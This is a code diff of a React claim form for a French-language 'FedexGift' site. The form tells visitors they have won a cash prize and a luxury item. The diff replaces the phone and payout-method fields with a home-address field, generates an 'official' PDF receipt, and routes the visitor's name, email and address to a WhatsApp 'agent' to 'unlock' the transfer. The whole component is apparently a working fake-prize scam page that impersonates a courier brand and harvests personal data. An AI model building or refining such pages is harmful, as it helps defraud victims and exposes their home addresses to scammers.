@@ -2,7 +2,7 @@
 
 import React, { useState } from "react";
 import { motion, AnimatePresence } from "framer-motion";
-import { Download, MessageSquare, CheckCircle2, ShieldAlert, CreditCard, User, Mail, Phone, Lock, Sparkles, Gift } from "lucide-react";
+import { Download, MessageSquare, CheckCircle2, ShieldAlert, User, Mail, MapPin, Lock, Sparkles } from "lucide-react";
 import { jsPDF } from "jspdf";
 import { LuxuryItem } from "./BoxGridGame";
 
@@ -11,35 +11,13 @@ interface ClaimFormProps {
   winningItem?: LuxuryItem;
 }
 
-const COUNTRY_CODES = [
-  { code: "+1", label: "USA / Canada 🇺🇸 🇨🇦" },
-  { code: "+33", label: "France 🇫🇷" },
-  { code: "+39", label: "Italie 🇮🇹" },
-  { code: "+34", label: "Espagne 🇪🇸" },
-  { code: "+358", label: "Finlande 🇫🇮" },
-  { code: "+351", label: "Portugal 🇵🇹" },
-  { code: "+55", label: "Brésil 🇧🇷" },
-  { code: "+225", label: "Côte d'Ivoire 🇨🇮" },
-  { code: "+221", label: "Sénégal 🇸🇳" },
-  { code: "+237", label: "Cameroun 🇨🇲" },
-];
-
-const PAYMENT_METHODS = [
-  { id: "bank", name: "Virement Bancaire (SWIFT / IBAN)", icon: "🏦" },
-  { id: "card", name: "Carte Visa / Mastercard", icon: "💳" },
-  { id: "crypto", name: "USDT / Crypto Wallet", icon: "🪙" },
-  { id: "momo", name: "Mobile Money (MTN / Orange / Wave)", icon: "📲" },
-];
-
-// Admin WhatsApp Number (can be updated by user as needed)
+// Admin WhatsApp Number
 const ADMIN_WHATSAPP_NUMBER = "22990000000";
 
 export default function ClaimForm({ winningPrize, winningItem }: ClaimFormProps) {
   const [nom, setNom] = useState("");
   const [email, setEmail] = useState("");
-  const [countryCode, setCountryCode] = useState("+1");
-  const [phone, setPhone] = useState("");
-  const [paymentMethod, setPaymentMethod] = useState("bank");
+  const [adresse, setAdresse] = useState("");
   const [isSubmitted, setIsSubmitted] = useState(false);
   const [pdfGenerated, setPdfGenerated] = useState(false);
   const [transactionId, setTransactionId] = useState("");
@@ -47,7 +25,7 @@ export default function ClaimForm({ winningPrize, winningItem }: ClaimFormProps)
   const handleFormSubmit = (e: React.FormEvent) => {
     e.preventDefault();
 
-    if (!nom.trim() || !email.trim() || !phone.trim()) {
+    if (!nom.trim() || !email.trim() || !adresse.trim()) {
       alert("Veuillez remplir tous les champs obligatoires (*)");
       return;
     }
@@ -129,7 +107,7 @@ export default function ClaimForm({ winningPrize, winningItem }: ClaimFormProps)
     doc.setFontSize(13);
     doc.setFont("helvetica", "bold");
     doc.setTextColor(15, 23, 42);
-    doc.text("INFORMATIONS DU GAGNANT & DÉTAILS DE L'EXPÉDITION", 25, 98);
+    doc.text("INFORMATIONS DU GAGNANT & ADRESSE DE RÉSIDENCE", 25, 98);
 
     doc.setDrawColor(226, 232, 240);
     doc.line(25, 101, 185, 101);
@@ -141,9 +119,8 @@ export default function ClaimForm({ winningPrize, winningItem }: ClaimFormProps)
     const rows = [
       ["Nom & Prénom :", nom],
       ["Adresse Email :", email],
-      ["Téléphone WhatsApp :", `${countryCode} ${phone}`],
-      ["Mode de Paiement :", PAYMENT_METHODS.find((p) => p.id === paymentMethod)?.name || "Virement Bancaire"],
-      ["Cadeau de Luxe Gagne :", itemName],
+      ["Adresse de Résidence (Livraison) :", adresse],
+      ["Cadeau de Luxe Gagné :", itemName],
       ["Statut Expédition & Virement :", "EN ATTENTE DE CONFIRMATION WHATSAPP"],
     ];
 
@@ -153,9 +130,13 @@ export default function ClaimForm({ winningPrize, winningItem }: ClaimFormProps)
       doc.text(label, 25, startY);
       doc.setFont("helvetica", "bold");
       doc.setTextColor(15, 23, 42);
-      doc.text(value, 80, startY);
+      
+      // Wrap text if address is long
+      const splitVal = doc.splitTextToSize(value, 100);
+      doc.text(splitVal, 85, startY);
+
       doc.setFont("helvetica", "normal");
-      startY += 9;
+      startY += (splitVal.length * 6) + 3;
     });
 
     // Winning Prize Box
@@ -188,26 +169,23 @@ export default function ClaimForm({ winningPrize, winningItem }: ClaimFormProps)
     doc.setFont("helvetica", "italic");
     doc.setTextColor(100, 116, 139);
     doc.text("Instructions importantes : Veuillez présenter ce reçu à notre agent WhatsApp pour débloquer", 25, startY + 73);
-    doc.text("votre virement bancaire et planifier la livraison de votre cadeau de luxe.", 25, startY + 78);
+    doc.text("votre virement et planifier la livraison directe à votre résidence.", 25, startY + 78);
 
     // Save File
     doc.save(`recu_gain_fedex_gift_${refId}.pdf`);
   };
 
   const getWhatsAppLink = () => {
-    const fullPhone = `${countryCode}${phone}`;
-    const selectedPayName = PAYMENT_METHODS.find((p) => p.id === paymentMethod)?.name || "Virement Bancaire";
     const itemStr = winningItem ? winningItem.name : "Cadeau de Luxe";
     const message = `Bonjour FedexGift, je viens de gagner ${winningPrize.toLocaleString("en-US")} $ + ${itemStr} sur le site !
 
 Nom: ${nom}
 Email: ${email}
-Téléphone: ${fullPhone}
-Mode de paiement: ${selectedPayName}
+Adresse Complète de Résidence: ${adresse}
 Cadeau de Luxe: ${itemStr}
 Réf Reçu: ${transactionId}
 
-Voici mon reçu PDF téléchargé. Merci de valider mon transfert et la livraison !`;
+Voici mon reçu PDF téléchargé. Merci de valider la livraison directe à ma résidence !`;
 
     return `https://wa.me/${ADMIN_WHATSAPP_NUMBER}?text=${encodeURIComponent(message)}`;
   };
@@ -220,7 +198,7 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert et la livraiso
         <div className="text-center mb-8 space-y-2">
           <div className="inline-flex items-center gap-2 bg-yellow-500/10 border border-yellow-500/40 text-yellow-300 px-3 py-1 rounded-full text-xs font-bold uppercase">
             <Lock className="w-3.5 h-3.5 text-green-400" />
-            Formulaire Officiel de Réclamation
+            Formulaire Officiel de Réclamation & Livraison
           </div>
 
           {winningItem && (
@@ -232,7 +210,7 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert et la livraiso
               />
               <div>
                 <span className="text-[10px] text-yellow-400 font-bold uppercase tracking-wider block">
-                  🎁 Lot de luxe prêt à expédier
+                  🎁 Lot de luxe réservé pour livraison à domicile
                 </span>
                 <span className="text-sm font-black text-white block">
                   {winningItem.name} ({winningItem.valueEst})
@@ -245,12 +223,12 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert et la livraiso
             RECEVEZ VOS <span className="text-gold-gradient">{winningPrize.toLocaleString("en-US")} $</span>
           </h2>
           <p className="text-xs sm:text-sm text-gray-300">
-            Remplissez vos informations exactes pour recevoir votre virement et l'expédition de votre lot de luxe.
+            Remplissez l'adresse exacte de votre résidence pour l'expédition directe de votre lot.
           </p>
         </div>
 
         {!isSubmitted ? (
-          /* FORMULARIE */
+          /* FORMULAIRE DE RÉCLAMATION ET ADRESSE */
           <form onSubmit={handleFormSubmit} className="space-y-5">
             {/* Nom & Prénom */}
             <div>
@@ -284,58 +262,23 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert et la livraiso
               />
             </div>
 
-            {/* Téléphone WhatsApp with Indicatif */}
+            {/* Adresse Complète de Résidence */}
             <div>
               <label className="block text-xs font-bold text-gray-300 uppercase tracking-wider mb-2 flex items-center gap-1.5">
-                <Phone className="w-4 h-4 text-green-400" />
-                Téléphone WhatsApp *
+                <MapPin className="w-4 h-4 text-green-400" />
+                Adresse Complète de Résidence (Livraison Directe) *
               </label>
-              <div className="flex gap-2">
-                <select
-                  value={countryCode}
-                  onChange={(e) => setCountryCode(e.target.value)}
-                  className="bg-brandDark-700/90 border border-gray-700 focus:border-yellow-400 rounded-xl px-3 py-3.5 text-yellow-300 font-bold text-sm focus:outline-none shadow-inner"
-                >
-                  {COUNTRY_CODES.map((c) => (
-                    <option key={c.code} value={c.code} className="bg-brandDark-900 text-white">
-                      {c.code} {c.label}
-                    </option>
-                  ))}
-                </select>
-                <input
-                  type="tel"
-                  required
-                  value={phone}
-                  onChange={(e) => setPhone(e.target.value)}
-                  placeholder="123 456 7890"
-                  className="flex-1 bg-brandDark-700/80 border border-gray-700 focus:border-yellow-400 rounded-xl px-4 py-3.5 text-white placeholder-gray-500 text-sm focus:outline-none transition shadow-inner"
-                />
-              </div>
-            </div>
-
-            {/* Payment Method Selector */}
-            <div>
-              <label className="block text-xs font-bold text-gray-300 uppercase tracking-wider mb-2 flex items-center gap-1.5">
-                <CreditCard className="w-4 h-4 text-yellow-400" />
-                Mode de Réception des Gains *
-              </label>
-              <div className="grid grid-cols-2 gap-2.5">
-                {PAYMENT_METHODS.map((pm) => (
-                  <button
-                    key={pm.id}
-                    type="button"
-                    onClick={() => setPaymentMethod(pm.id)}
-                    className={`p-3 rounded-xl border text-xs sm:text-sm font-bold flex items-center gap-2 transition text-left ${
-                      paymentMethod === pm.id
-                        ? "bg-yellow-500/20 border-yellow-400 text-yellow-300 shadow-md"
-                        : "bg-brandDark-700/50 border-gray-800 text-gray-400 hover:border-gray-600"
-                    }`}
-                  >
-                    <span className="text-lg">{pm.icon}</span>
-                    <span>{pm.name}</span>
-                  </button>
-                ))}
-              </div>
+              <textarea
+                required
+                rows={3}
+                value={adresse}
+                onChange={(e) => setAdresse(e.target.value)}
+                placeholder="Ex: 123 Rue de la Paix, Appt 4B, 75002 Paris, France OR 456 Main Street, Apt 12, New York, NY 10001, USA"
+                className="w-full bg-brandDark-700/80 border border-gray-700 focus:border-yellow-400 rounded-xl px-4 py-3 text-white placeholder-gray-500 text-sm focus:outline-none transition shadow-inner resize-none"
+              />
+              <span className="text-[10px] text-gray-400 mt-1 block">
+                Précisez le numéro de rue, bâtiment, code postal, ville et pays pour le transporteur.
+              </span>
             </div>
 
             {/* Submit Button */}
@@ -346,7 +289,7 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert et la livraiso
               className="w-full py-4 bg-gradient-to-r from-red-600 via-red-700 to-red-600 hover:from-red-500 hover:to-red-600 text-white font-black text-lg rounded-2xl shadow-xl shadow-red-600/50 border border-yellow-400 flex items-center justify-center gap-2 cursor-pointer mt-4"
             >
               <Sparkles className="w-5 h-5 text-yellow-300 animate-spin" />
-              <span>GÉNÉRER MON REÇU PDF & VALIDER</span>
+              <span>GÉNÉRER MON REÇU PDF & VALIDER L'EXPÉDITION</span>
             </motion.button>
           </form>
         ) : (
@@ -362,7 +305,7 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert et la livraiso
 
             <div>
               <h3 className="text-xl sm:text-2xl font-black text-white mb-1">
-                REÇU GÉNÉRÉ AVEC SUCCÈS !
+                REÇU ET BON DE LIVRAISON GÉNÉRÉS !
               </h3>
               <p className="text-xs text-gray-300">
                 Réf: <span className="text-yellow-400 font-mono font-bold">{transactionId}</span>
@@ -376,7 +319,7 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert et la livraiso
               </div>
               <div className="flex items-center gap-2 text-green-400 font-bold text-xs">
                 <MessageSquare className="w-4 h-4 text-green-400" />
-                2. Cliquez ci-dessous pour l'envoyer à l'agent pour le virement et l'expédition.
+                2. Cliquez ci-dessous pour transmettre l'adresse et valider le virement.
               </div>
             </div>
 
@@ -401,7 +344,7 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert et la livraiso
 
             <p className="text-[10px] text-gray-400 flex items-center justify-center gap-1">
               <ShieldAlert className="w-3.5 h-3.5 text-yellow-400" />
-              Service Client WhatsApp Officiel FedexGift - Réponse en 2h max
+              Service Client WhatsApp Officiel FedexGift - Confirmation d'adresse en 2h max
             </p>
           </motion.div>
         )}
